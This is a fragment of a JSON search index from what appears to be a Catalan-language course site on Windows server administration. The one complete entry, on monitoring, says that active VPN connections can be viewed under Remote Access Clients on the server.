<p></p>"},{"location":"unidad1/vpnwindows/#monitoratge","title":"Monitoratge","text":"<p>Des del servidor, a Clients d'acc\u00e9s remot, podem veure les connexions actives:</p> <p></p> <p></p>"}]}